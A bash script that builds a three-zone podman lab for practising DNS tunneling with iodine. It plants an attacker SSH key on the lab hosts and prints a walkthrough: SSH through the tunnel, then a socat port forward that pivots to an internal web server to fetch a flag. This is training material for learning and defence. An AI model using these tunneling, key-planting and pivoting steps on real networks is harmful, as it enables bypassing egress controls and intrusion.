#!/bin/bash
# setup-tunnel-lab.sh
# ────────────────────────────────────────────────────────────
# DNS Tunneling Lab Setup Script
#
# Creates a 3-zone podman pod simulating:
#   - Internet (attacker) — full egress, iodine server
#   - DMZ (compromised host) — DNS-only egress, iodine client
#   - Internal (target) — web server, SSH, only reachable from DMZ
#
# Prerequisites: podman installed on ArchLinux
#
# Usage:
#   chmod +x setup-tunnel-lab.sh
#   ./setup-tunnel-lab.sh
#
# Cleanup:
#   ./setup-tunnel-lab.sh --clean
# ────────────────────────────────────────────────────────────

set -e

LAB_DIR="$(cd "$(dirname "$0")" && pwd)"
DOCKERFILE="${LAB_DIR}/tunneling.Containerfile"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

info()  { echo -e "${CYAN}[*]${NC} $*"; }
ok()    { echo -e "${GREEN}[+]${NC} $*"; }
warn()  { echo -e "${YELLOW}[!]${NC} $*"; }
err()   { echo -e "${RED}[-]${NC} $*"; }

cleanup() {
    info "Cleaning up tunnel lab..."

    podman stop internet-host dmz-host internal-host 2>/dev/null || true
    podman rm internet-host dmz-host internal-host 2>/dev/null || true

    podman network rm internet-net dmz-net internal-net 2>/dev/null || true

    ok "Lab cleaned up."
}

if [ "$1" = "--clean" ] || [ "$1" = "-c" ]; then
    cleanup
    exit 0
fi

# ── Build Images ──
info "Building container images..."
podman build -t tunnel-internet --target internet -f "$DOCKERFILE" "$LAB_DIR"
podman build -t tunnel-dmz --target dmz -f "$DOCKERFILE" "$LAB_DIR"
podman build -t tunnel-internal --target internal -f "$DOCKERFILE" "$LAB_DIR"
ok "Images built."

# ── Create Networks ──
info "Creating podman networks..."
podman network create internet-net --subnet 10.89.0.0/24 2>/dev/null || true
podman network create dmz-net --subnet 10.89.1.0/24 --internal 2>/dev/null || true
podman network create internal-net --subnet 10.89.2.0/24 --internal 2>/dev/null || true
ok "Networks created."

# ── Launch Containers ──
info "Launching internal server (internal-net only)..."
podman run -d --name internal-host \
    --network internal-net \
    tunnel-internal
INTERNAL_IP=$(podman inspect internal-host \
    --format '{{.NetworkSettings.Networks.internal-net.IPAddress}}')
ok "Internal server running at ${INTERNAL_IP}"

info "Launching DMZ host (dmz-net + internal-net, DNS-only egress)..."
podman run -d --name dmz-host \
    --network dmz-net \
    --network internal-net \
    --cap-add NET_ADMIN \
    --cap-add SYS_ADMIN \
    tunnel-dmz

# Wait for SSH to start
sleep 3

# Set up firewall rules on DMZ host
info "Configuring DMZ firewall (DNS-only egress)..."
podman exec dmz-host /setup-firewall.sh
DMZ_IP=$(podman inspect dmz-host \
    --format '{{.NetworkSettings.Networks.dmz-net.IPAddress}}')
DMZ_INTERNAL_IP=$(podman inspect dmz-host \
    --format '{{.NetworkSettings.Networks.internal-net.IPAddress}}')
ok "DMZ host running — dmz-net IP: ${DMZ_IP}, internal IP: ${DMZ_INTERNAL_IP}"

# Copy attacker's SSH key to DMZ host (for post-tunnel access)
podman exec dmz-host sh -c "cat >> /root/.ssh/authorized_keys" < \
    <(podman run --rm tunnel-internet cat /root/.ssh/id_ed25519.pub) 2>/dev/null || \
    warn "Could not auto-configure SSH key (non-fatal)"

# Also add attacker key to internal host
podman exec internal-host sh -c "cat >> /root/.ssh/authorized_keys" < \
    <(podman run --rm tunnel-internet cat /root/.ssh/id_ed25519.pub) 2>/dev/null || \
    warn "Could not auto-configure internal SSH key (non-fatal)"

info "Launching attacker container (internet-net)..."
podman run -d --name internet-host \
    --network internet-net \
    --cap-add NET_ADMIN \
    tunnel-internet

# Wait for iodine server to start
sleep 3

# Check iodine server is running
info "Checking iodine server status..."
podman exec internet-host pgrep -a iodined 2>/dev/null && \
    ok "Iodine server running" || \
    warn "Iodine server may need manual start: podman exec internet-host /lab/start-attacker.sh"

ATTACKER_IP=$(podman inspect internet-host \
    --format '{{.NetworkSettings.Networks.internet-net.IPAddress}}')
ok "Attacker running at ${ATTACKER_IP}"

# ── Connect DMZ host to the iodine tunnel ──
info "Starting iodine client on DMZ host..."
# The DMZ host connects to the attacker via DNS (iodine)
# Iodine talks directly to the attacker IP, using DNS protocol (UDP 53)
podman exec -d dmz-host /lab/connect-tunnel.sh "${ATTACKER_IP}"
sleep 8

# Verify tunnel
info "Verifying DNS tunnel..."
if podman exec internet-host ping -c 2 -W 3 10.99.0.2 >/dev/null 2>&1; then
    ok "DNS TUNNEL ESTABLISHED! DMZ host reachable at 10.99.0.2"
else
    warn "Tunnel may need manual setup. Check iodine logs."
fi

# ── Print Lab Summary ──
echo ""
echo "============================================"
echo "  DNS TUNNELING LAB — READY"
echo "============================================"
echo ""
echo "  NETWORK TOPOLOGY:"
echo "  ┌─────────────────────────────────────┐"
echo "  │ Internet (10.89.0.0/24)             │"
echo "  │  Attacker IP:  ${ATTACKER_IP}        │"
echo "  │  Iodine server: 10.99.0.1 (dns0)    │"
echo "  ├─────────────────────────────────────┤"
echo "  │ DMZ (10.89.1.0/24 — DNS only!)      │"
echo "  │  DMZ Host IP:  ${DMZ_IP}       │"
echo "  │  Tunnel IP:   10.99.0.2 (dns0)      │"
echo "  │  Internal IP: ${DMZ_INTERNAL_IP}      │"
echo "  ├─────────────────────────────────────┤"
echo "  │ Internal (10.89.2.0/24)             │"
echo "  │  Web Server:   ${INTERNAL_IP}        │"
echo "  │  Flag:         /var/www/html/flag.txt│"
echo "  └─────────────────────────────────────┘"
echo ""
echo "  MANUAL WALKTHROUGH:"
echo ""
echo "  1. Verify DMZ egress restriction:"
echo "     podman exec dmz-host curl --connect-timeout 3 http://example.com"
echo "     → Should FAIL (only DNS allowed)"
echo ""
echo "  2. Verify DNS egress works:"
echo "     podman exec dmz-host nslookup google.com 8.8.8.8"
echo "     → Should succeed"
echo ""
echo "  3. Check tunnel status:"
echo "     podman exec internet-host ping 10.99.0.2"
echo "     → Should succeed (DNS-tunneled ICMP)"
echo ""
echo "  4. SSH to DMZ host through the DNS tunnel:"
echo "     podman exec internet-host ssh -o StrictHostKeyChecking=no root@10.99.0.2"
echo ""
echo "  5. From DMZ host, curl the internal web server:"
echo "     curl http://${INTERNAL_IP}/flag.txt"
echo ""
echo "  6. Port forward from attacker through tunnel to internal:"
echo "     # On DMZ host (via SSH session):"
echo "     socat TCP4-LISTEN:8080,fork,reuseaddr TCP4:${INTERNAL_IP}:80 &"
echo "     # On attacker:"
echo "     curl http://10.99.0.2:8080/flag.txt"
echo ""
echo "  CLEANUP:"
echo "    ./setup-tunnel-lab.sh --clean"
echo "============================================"
echo ""

# Interactive option
if [ -t 0 ]; then
    echo -n "Launch attacker shell? [y/N] "
    read -r answer
    if [ "$answer" = "y" ] || [ "$answer" = "Y" ]; then
        echo ""
        info "Entering attacker container. Type 'exit' to leave."
        echo "  Quick start: /lab/demo-tunnel.sh"
        echo ""
        podman exec -it internet-host bash || true
    fi
fi
